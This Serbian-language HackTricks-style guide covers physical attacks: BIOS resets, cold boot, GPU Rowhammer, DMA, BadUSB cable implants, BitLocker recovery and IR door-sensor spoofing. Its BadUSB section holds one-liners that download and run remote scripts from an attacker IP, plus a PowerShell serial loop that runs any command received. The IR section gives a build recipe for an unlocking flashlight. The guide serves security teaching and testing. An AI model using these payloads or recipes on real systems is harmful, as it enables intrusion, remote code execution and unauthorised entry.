# Fizički napadi

{{#include ../banners/hacktricks-training.md}}

## Oporavak BIOS lozinke i bezbednost sistema

Podešavanja firmvera na starijim PC računarima mogu se resetovati isključivanjem CMOS baterije ili korišćenjem dokumentovanog džampera za brisanje CMOS-a. Potrebno vreme isključenja zavisi od matične ploče, a moderne UEFI lozinke ili ključevi mogu biti smešteni u neisparljivoj fleš memoriji, ugrađenom kontroleru ili bezbednosnom uređaju, pa mogu ostati sačuvani i nakon uklanjanja baterije. Pre spajanja pinova proverite priručnik za matičnu ploču ili servisni priručnik; ovim postupkom se mogu poništiti i TPM merenja i pokrenuti oporavak šifrovanog diska.

Na starijim x86 sistemima, alati kao što su **killCMOS** i **CmosPwd** mogu da pregledaju ili izmene podešavanja sačuvana u CMOS-u iz okruženja za pokretanje. CmosPwd prepoznaje formate lozinki iz dokumentovanog skupa starijih BIOS porodica i može da napravi rezervnu kopiju, vrati ili obriše/uništi stanje CMOS-a; njegove objavljene verzije namenjene su starijim DOS/Windows, Linux, FreeBSD i NetBSD okruženjima.<sup>[[18]](#references)</sup> Ovi alati nisu univerzalni alati za uklanjanje UEFI lozinki i zahtevaju dovoljan pristup hardveru i firmveru.

Neki firmveri prenosnih računara prikazuju kod izazova specifičan za proizvođača nakon nekoliko neuspelih pokušaja unosa lozinke. Baze podataka kao što je [bios-pw.org](https://bios-pw.org) mogu da izračunaju lozinke za oporavak starijih sistema određenih proizvođača, ali mnogi sistemi primenjuju zaključavanje bez koda izazova iz kojeg se lozinka može izračunati. Svaku generisanu lozinku smatrajte specifičnom za model i izbegavajte iscrpljivanje brojača pokušaja koji se ne može resetovati.

### UEFI bezbednost

Za moderne **UEFI** sisteme, CHIPSEC može da proveri zaštitu promenljivih Secure Boot-a. Najpre pokrenite proveru koja ne menja sistem; opcioni režim `-a modify` namerno pokušava da ošteti promenljive i treba ga koristiti samo na laboratorijskom sistemu koji se može oporaviti. Sam CHIPSEC upozorava da njegov privilegovani drajver i pristup hardveru niskog nivoa nisu pogodni za produkcione krajnje uređaje.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Analiza RAM-a i Cold Boot napadi

DRAM ne gubi odmah svaki bit kada se osvežavanje zaustavi. Brzina gubitka podataka znatno se razlikuje u zavisnosti od tehnologije modula i temperature; hlađenje može očuvati korisne podatke mnogo duže nego ciklus isključivanja i ponovnog uključivanja bez hlađenja. Cold-boot napad brzo ponovo pokreće sistem u malom okruženju za prikupljanje podataka ili premešta ohlađeni modul, snima sirovu memoriju i rekonstruiše kriptografske ključeve uprkos gubitku pojedinih bitova. Alat za kopiranje diska nije automatski alat za snimanje fizičke memorije, a Volatility analizira snimak, ali ga ne pribavlja; koristite validiran alat za pribavljanje podataka koji odgovara platformi.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer napadi na tabele stranica

Savremeni GPU Rowhammer napadi postaju znatno korisniji kada ciljaju **metapodatke GPU virtuelne memorije** umesto običnih bafera. Nedavna istraživanja na **GDDR6 NVIDIA Ampere GPU-ovima** pokazuju da napadač koji pokreće CUDA kod bez privilegija može da napravi obrasce hammering-a specifične za GPU, koristi **memory massaging** da smesti strukture za paginaciju u ranjive redove, a zatim preokrene bitove u **tabeli stranica poslednjeg nivoa** ili posrednom **direktorijumu stranica**. Kada se ošteti jedan unos za prevođenje, napadač može da uspostavi **proizvoljno čitanje/upisivanje GPU memorije**, a zatim da pređe na kompromitovanje hosta.<sup>[[1]](#references)[[2]](#references)</sup>

### Obrazac eksploatacije

1. **Profilisati redove podložne hammering-u** u GDDR6 i napraviti obrasce hammering-a koji uvažavaju osvežavanje ili su neuniformni, kako bi se zaobišle zaštite ugrađene u DRAM.
2. **Manipulisati GPU alokacijama** tako da drajver smesti strukture za prevođenje stranica na fizičke lokacije podložne hammering-u, umesto da ih zadrži u podrazumevanom zaštićenom skupu. U praksi to može podrazumevati iscrpljivanje regiona tabela stranica u memoriji niskog opsega i raspoređivanje velikih, retkih UVM mapiranja sa kontrolisanim koracima.
3. **Preokrenuti bitove u metapodacima za prevođenje**, kao što su **PFN** ili bitovi povezani sa aperture-om, unutar unosa tabele stranica ili direktorijuma stranica, tako da se virtuelna stranica koju kontroliše napadač razreši u stranice tabela stranica, proizvoljnu GPU memoriju ili sistemska mapiranja vidljiva hostu.
4. Ponovo upotrebiti falsifikovano mapiranje za prepisivanje dodatnih unosa za prevođenje i eskalaciju do **proizvoljnog čitanja/upisivanja GPU memorije** u različitim GPU kontekstima.

### Prelazak na host i mere ublažavanja

- Kada je **IOMMU onemogućen**, falsifikovana mapiranja sistemskog aperture-a mogu da izlože proizvoljnu **fizičku memoriju hosta** GPU-u, pretvarajući GPU primitivu u potpuno kompromitovanje hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** cilja unose tabela stranica poslednjeg nivoa, dok **GeForge** pokazuje da oštećivanje nivoa direktorijuma stranica može biti lakše jer jedan preokrenuti bit može da preusmeri veće podstablo prevođenja. Nemojte smatrati da je samo jedan nivo paginacije kritičan za bezbednost.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** je i dalje važan jer blokira direktan pristup proizvoljnoj memoriji hosta koji koriste GDDRHammer/GeForge, ali **nije potpuno rešenje**. **GPUBreach** pokazuje drugi korak napada, u kojem napadač oštećuje ba fere CPU-a koji su upisivi iz GPU-a i u vlasništvu su drajvera, a zatim pokreće greške NVIDIA drajvera povezane sa bezbednošću memorije kako bi dobio primitivu za upis u kernel i **root shell**, čak i kada je IOMMU omogućen.<sup>[[3]](#references)</sup>
- **ECC na nivou sistema** je praktična mera za ojačavanje bezbednosti na podržanim GPU-ovima za radne stanice i servere. Potrošački GPU-ovi bez ECC-a pružaju slabiju odbranu.<sup>[[4]](#references)</sup>
- Ovi napadi nisu samo teorijski: **GeForge** je prijavio **1,171** preokrenut bit na RTX 3060 i **202** na RTX A6000, što je bilo dovoljno za izgradnju funkcionalnog lanca eskalacije privilegija na hostu.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Napadi direktnim pristupom memoriji (DMA)

Za offline UEFI IFR/NVRAM izmenu koja može da oslabi sprovođenje IOMMU pravila pre pokretanja sistema i omogući Windows DMA lanac napada, pogledajte:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstrira **pribavljanje i izmenu memorije putem DMA-a** preko interfejsa kao što su FireWire i ranije Thunderbolt konfiguracije, uključujući istorijske potpise za zaobilaženje prijave. Nije jednostavno „neefikasan protiv Windows 10“: mogućnost eksploatacije zavisi od interfejsa, verzije sistema, IOMMU pravila, stanja zaključavanja i toga da li je Windows Kernel DMA Protection podržan i omogućen. Windows 10 verzija 1803 i novije uvele su Kernel DMA Protection na kompatibilnim platformama, čime se površina napada znatno promenila.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB za pristup sistemu

Na nešifrovanom ili već otključanom Windows volumenu, offline okruženje može da zameni binarne datoteke za pristupačnost, kao što su **sethc.exe** ili **Utilman.exe**, datotekom **cmd.exe**, čime se dobija komandna linija sa privilegijama SYSTEM kada se upotrebi odgovarajuća prečica na ekranu za prijavu. Alati kao što je **chntpw** mogu da izmene podatke lokalnih SAM naloga. Ovi postupci ne zaobilaze zaključan BitLocker volumen i mogu da oštete akreditive zaštićene pomoću DPAPI/EFS; sačuvajte forenzičke kopije i rezervne kopije.

**Kon-Boot** je komercijalni alat za zaobilaženje autentifikacije pri pokretanju sistema, namenjen podržanim Windows/macOS konfiguracijama. Kompatibilnost zavisi od OS-a, režima firmvera, Secure Boot-a i podešavanja šifrovanja diska; alat ne dešifruje BitLocker volumen koji je zaključan.<sup>[[10]](#references)</sup>

---

## Rukovanje Windows bezbednosnim funkcijama

### Prečice za pokretanje sistema i oporavak

- **Delete/Supr**, F2, F10 ili neki drugi taster proizvođača može da otvori podešavanja firmvera.
- **F8** otvara zastarele napredne opcije pokretanja sistema Windows samo u konfiguracijama u kojima je ta mogućnost i dalje omogućena; način ulaska u trenutno okruženje za oporavak se razlikuje.
- Držanje tastera **Shift** može da spreči automatsku prijavu u Windows u nekim konfiguracijama, mada podešavanja pravila ili registra mogu da onemoguće takvo ponašanje.<sup>[[17]](#references)</sup>

### BAD USB uređaji

Uređaji kao što su **USB Rubber Ducky** i Teensy ploče mogu da se predstave kao pouzdane HID tastature i unose unapred definisane pritiske tastera. Korisni teret u početku ima iste privilegije i pristup radnoj površini kao prijavljena sesija; UAC upiti, zaključavanje ekrana, raspored tastature, vremenski raspored i USB pravila krajnje tačke i dalje ga ograničavaju.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administratorske ili rezervne privilegije mogu da kreiraju senku kopiju ili sačuvaju hive-ove registra kako bi se pribavile zaključane datoteke kao što su **SAM** i **SYSTEM**. Ovo je tehnika prikupljanja podataka nakon kompromitovanja, a ne zaobilaženje privilegija; treba je povezati sa događajima `diskshadow`/VSS i izvoza hive-ova registra.

## BadUSB / HID tehnike implantata

### Wi-Fi implantati u kablovima

- Implantati zasnovani na ESP32-S3, kao što je **Evil Crow Cable Wind**, sakrivaju se u kablovima USB-A→USB-C ili USB-C↔USB-C, predstavljaju se isključivo kao USB tastatura i preko Wi-Fi mreže izlažu svoj C2 stek. Operater treba samo da napaja kabl preko računara žrtve, napravi hotspot pod nazivom `Evil Crow Cable Wind` sa lozinkom `123456789` i otvori [http://cable-wind.local/](http://cable-wind.local/) (ili njegovu DHCP adresu) da bi pristupio ugrađenom HTTP interfejsu.<sup>[[8]](#references)</sup>
- Veb interfejs sadrži kartice *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Sačuvani korisni tereti označeni su prema OS-u, rasporedi tastature menjaju se u hodu, a VID/PID stringovi mogu da se izmene kako bi oponašali poznate periferne uređaje.
- Pošto se C2 nalazi unutar kabla, telefonom se mogu pripremiti korisni tereti, pokrenuti njihovo izvršavanje i upravljati Wi-Fi akreditivima bez korišćenja mreže organizacije — korisno za fizičke upade sa kratkim vremenom zadržavanja.

### OS-aware AutoExec korisni tereti

- Pravila AutoExec povezuju jedan ili više korisnih tereta sa pokretanjem odmah nakon enumeracije USB uređaja. Implantat obavlja osnovno prepoznavanje OS-a i bira odgovarajuću skriptu.
- Primer toka rada:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) ili `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Pošto se izvršavanje odvija bez nadzora, jednostavna zamena kabla za punjenje može da obezbedi početni pristup „plug-and-pwn“ u kontekstu prijavljenog korisnika.

### HID-om pokrenut udaljeni shell preko Wi-Fi TCP-a

1. **Pokretanje preko pritisaka tastera:** Sačuvani korisni teret otvara konzolu i unosi petlju koja izvršava sve što stigne sa novog USB serijskog uređaja. Minimalna Windows varijanta je:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Kablovski most:** Implant održava USB CDC kanal otvorenim dok njegov ESP32-S3 pokreće TCP klijent (Python skriptu, Android APK ili desktop izvršnu datoteku) koji se povezuje nazad sa operatorom. Svi bajtovi uneti u TCP sesiju prosleđuju se u gornju serijsku petlju, čime se omogućava udaljeno izvršavanje komandi čak i na air-gapped hostovima. Izlaz je ograničen, pa operatori obično pokreću komande naslepo (kreiranje naloga, priprema dodatnih alata itd.).

### Površina za HTTP OTA ažuriranje

- Dokumentovani interfejs Evil Crow Cable Wind izlaže neautentifikovanu krajnju tačku za ažuriranje firmvera na `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Terenski operateri mogu da menjaju funkcije u hodu (npr. da instaliraju firmware za USB Army Knife) tokom angažovanja, bez otvaranja kabla, što omogućava implantatu da pređe na nove mogućnosti dok je i dalje priključen na ciljni host.

## Zaobilaženje BitLocker šifrovanja

Ovlašćeno forenzičko preuzimanje podataka sa sistema koji je uključen ili je nedavno radio može da sadrži glavni ključ BitLocker volumena ili povezani ključni materijal dok je volumen otključan. Komercijalni alati kao što su Elcomsoft Forensic Disk Decryptor i Passware Kit Forensic mogu da pretražuju podržane memorijske slike, datoteke hibernacije ili ispise pada sistema, ali uspeh nije zagarantovan. Savremeni Windows takođe šifruje ispise pada sistema kada je BitLocker omogućen, a sačuvana 48-cifrena lozinka za oporavak razlikuje se od ključa volumena koji se nalazi u memoriji.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Društveni inženjering za dodavanje ključa za oporavak

Napadač koji ubedi administratora da pokrene komande za upravljanje BitLocker-om može da doda lozinku za oporavak, spoljašnji ključ ili drugi zaštitni mehanizam, a zatim da ga preuzme. Lozinka za oporavak ne može biti proizvoljan niz nula: numeričke lozinke za oporavak BitLocker-a moraju imati validiran format od 48 cifara. Odgovarajuća sintaksa za ovlašćeno administriranje je `manage-bde -protectors -add C: -recoverypassword`; dodate zaštitne mehanizme možete da prikažete pomoću `manage-bde -protectors -get C:`. Pratite dodavanje zaštitnih mehanizama i uverite se da se novi materijal za oporavak čuva samo na odobrenim lokacijama.<sup>[[16]](#references)</sup>

---

## Iskorišćavanje prekidača za otvaranje kućišta / održavanje radi vraćanja BIOS-a na fabrička podešavanja

Mnogi savremeni laptopovi i kompaktni desktop računari imaju **prekidač za otvaranje kućišta**, čiji rad nadgledaju ugrađeni kontroler (EC) i firmware BIOS/UEFI. Iako je osnovna namena prekidača da aktivira upozorenje kada se uređaj otvori, proizvođači ponekad implementiraju **nedokumentovanu prečicu za oporavak** koja se aktivira kada se prekidač prebaci određenim redosledom.<sup>[[5]](#references)[[6]](#references)</sup>

### Kako napad funkcioniše

1. Prekidač je povezan sa **GPIO prekidom** na EC-u.
2. Firmware koji radi na EC-u prati **vreme i broj pritisaka**.
3. Kada se prepozna unapred definisan redosled, EC poziva rutinu *mainboard-reset* koja **briše sadržaj sistemskog NVRAM-a/CMOS-a**.
4. Pri sledećem pokretanju, na pogođenim modelima učitava se resetovano stanje firmware-a. U zavisnosti od proizvođača i revizije, obrisani podaci mogu da obuhvataju administratorsku lozinku, prilagođena podešavanja pokretanja ili upisane ključeve za Secure Boot; stanje TPM-a i uticaj na šifrovanje diska treba proceniti odvojeno.

> Resetovanje firmware-a može da ponovo omogući pokretanje sa spoljašnjih uređaja, ali **ne** dešifruje skladište podataka. BitLocker ili drugi sistem za šifrovanje celog diska može da zatraži oporavak nakon promena TPM-a/firmware-a, a da pritom interni disk i dalje ostane zaštićen bez ključa za oporavak.<sup>[[16]](#references)</sup>

### Primer iz stvarnog sveta – Framework 13 Laptop

Prečica za oporavak na Framework 13 (11./12./13. generacije) je:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Posle desetog ciklusa, EC postavlja zastavicu koja nalaže BIOS-u da obriše NVRAM pri sledećem ponovnom pokretanju. Ceo postupak traje oko 40 s i ne zahteva **ništa osim odvijača**.<sup>[[5]](#references)</sup>

### Opšti postupak eksploatacije

1. Uključite ili uspavajte-pa-probudite cilj da bi EC bio pokrenut.
2. Uklonite donji poklopac da biste otkrili prekidač za otvaranje/održavanje.
3. Ponovite obrazac prebacivanja specifičan za proizvođača (pogledajte dokumentaciju, forume ili izvršite reverse engineering firmvera EC-a).
4. Ponovo sastavite uređaj i pokrenite ga, pa proverite koja su se podešavanja firmvera i kredencijali zaista promenili.
5. Ako imate ovlašćenje i moguće je eksterno pokretanje, pokrenite kontrolisanu live sliku. Kada se interni volumen legitimno otključa (ili ako nikada nije bio šifrovan), live okruženje može da pribavi kredencijale i podatke ili pregleda EFI System Partition. Izmena te particije radi instaliranja EFI implantata je trajna i veoma invazivna, a i dalje je ograničavaju Secure Boot, measured boot, zaštita od upisivanja u firmver i nadzor krajnjih tačaka. Šifrovanom skladištu nije moguće pristupiti bez ključa ili materijala za oporavak.

### Otkrivanje i ublažavanje rizika

* Beležite događaje otvaranja kućišta u konzoli za upravljanje OS-om i upoređujte ih sa neočekivanim resetovanjima BIOS-a.
* Koristite **pečate koji otkrivaju neovlašćeno otvaranje** na zavrtnjima/poklopcima.
* Držite uređaje u **fizički kontrolisanim prostorima**; pretpostavite da fizički pristup znači potpun kompromis.
* Ako je moguće, onemogućite proizvođačevu funkciju „maintenance switch reset“ ili zahtevajte dodatno kriptografsko odobrenje za resetovanje NVRAM-a.

---

## Prikrivena IR injekcija protiv senzora za izlaz bez dodira

### Karakteristike senzora
- Komercijalni senzori „wave-to-exit“ kombinuju near-IR LED emiter sa prijemnim modulom nalik onom u daljinskom upravljaču za TV, koji prijavljuje logičku jedinicu tek kada detektuje više impulsa (~4–10) na odgovarajućoj nosećoj frekvenciji (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastični štitnik sprečava da emiter i prijemnik budu direktno okrenuti jedan prema drugom, pa kontroler pretpostavlja da je svaki validirani signal na nosećoj frekvenciji došao od refleksije u blizini i aktivira relej koji otključava električni prihvatnik vrata.
- Kada kontroler detektuje metu, često menja modulacioni omotač signala koji emituje, ali prijemnik nastavlja da prihvata svaki paket koji odgovara filtriranoj nosećoj frekvenciji.

### Tok napada
1. **Zabeležite profil emisije** – priključite logički analizator na pinove kontrolera da biste snimili talasne oblike pre detekcije i posle nje, koji pokreću interni IR LED.
2. **Ponovo emitujte samo talasni oblik „posle detekcije“** – uklonite ili zanemarite fabrički emiter i pokrenite eksterni IR LED signalom koji se inače javlja nakon aktiviranja, odmah od početka. Pošto je prijemniku bitan samo broj impulsa/frekvencija, on lažni signal smatra stvarnom refleksijom i aktivira relejnu liniju.
3. **Ograničite emitovanje u impulsima** – šaljite noseći signal u podešenim paketima (npr. uključeno nekoliko desetina milisekundi, pa isključeno približno isto toliko) da biste obezbedili minimalan broj impulsa, a da ne zasitite AGC prijemnika ili logiku za obradu smetnji. Neprekidno emitovanje brzo smanjuje osetljivost senzora i sprečava aktiviranje releja.

### Reflektivna injekcija velikog dometa
- Zamena LED-a sa probnog stola snažnom IR diodom, MOSFET drajverom i fokusnom optikom omogućava pouzdano aktiviranje sa udaljenosti od ~6 m.
- Napadaču nije potrebna direktna vidljivost otvora prijemnika; usmeravanjem snopa ka unutrašnjim zidovima, policama ili dovratnicima koji se vide kroz staklo, reflektovana energija može da uđe u vidno polje od ~30° i oponaša mahanje rukom iz blizine.
- Pošto prijemnici očekuju samo slabe refleksije, mnogo snažniji spoljašnji snop može da se odbije od više površina, a da i dalje ostane iznad praga detekcije.

### Napadačka lampa
- Ugradnja drajvera u komercijalnu baterijsku lampu skriva alat naočigled svih. Zamenite vidljivi LED snažnim IR LED-om koji odgovara opsegu prijemnika, dodajte ATtiny412 (ili sličan mikrokontroler) za generisanje impulsa na ≈30 kHz i upotrebite MOSFET za odvođenje struje LED-a.
- Teleskopsko zum- sočivo sužava snop radi većeg dometa/preciznosti, dok vibracioni motor kojim upravlja MCU pruža haptičku potvrdu da je modulacija aktivna, bez emitovanja vidljive svetlosti.
- Prebacivanje između nekoliko sačuvanih obrazaca modulacije (neznatno različite noseće frekvencije i omotači) povećava kompatibilnost sa različitim, pod drugim brendom prodavanim porodicama senzora. Operater može da pretražuje reflektujuće površine dok relej ne klikne čujno i vrata se ne otključaju.

---

## References

- [1] [GDDRHammer: Značajno ometanje DRAM redova — Rowhammer napadi između komponenti na modernim GPU-ovima](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Rowhammer napadi na GDDR memoriju radi falsifikovanja GPU tabela stranica iz zabave i zarade](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Napadi za eskalaciju privilegija na GPU-ovima pomoću Rowhammer-a](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Bezbednosno obaveštenje: Rowhammer - jul 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Pritisnite ovde da preuzmete kontrolu”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Vodič za resetovanje matične ploče](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Zaobilaženje IR senzora za izlaz bez dodira pomoću prikrivene IR lampe”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Priključi, pokreni, preuzmi kontrolu: hakovanje pomoću Evil Crow Cable Wind-a”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer napad na NVIDIA čipove](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Zvanična dokumentacija i informacije o kompatibilnosti Kon-Boot-a](https://kon-boot.com/)
- [11] [CHIPSEC dokumentacija - Zaštita Secure Boot promenljivih](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Da ne bismo zaboravili: Cold Boot napadi na ključeve za šifrovanje](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - fizička manipulacija memorijom preko DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Zaštita kernela od DMA napada](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Dokumentacija za Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Vodič za BitLocker operacije](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Držanje tastera Shift i ponašanje automatske prijave](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Dokumentacija i preuzimanja za CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
